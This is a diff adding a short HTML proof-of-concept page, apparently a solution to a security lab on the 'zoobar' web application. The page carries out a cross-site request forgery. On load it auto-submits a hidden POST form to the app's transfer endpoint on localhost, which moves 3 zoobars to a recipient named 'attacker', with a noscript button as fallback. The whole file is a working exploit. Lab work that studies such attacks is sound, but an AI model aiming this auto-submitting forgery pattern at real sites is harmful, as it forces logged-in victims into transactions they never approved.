@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>CSRF Transfer PoC</title>
+  </head>
+  <body onload="document.forms[0].submit()">
+    <form method="POST" action="http://localhost:8080/zoobar/index.cgi/transfer">
+      <input type="hidden" name="recipient" value="attacker">
+      <input type="hidden" name="zoobars" value="3">
+      <input type="hidden" name="submission" value="Send">
+      <noscript>
+        <input type="submit" value="Submit forged transfer">
+      </noscript>
+    </form>
+  </body>
+</html>
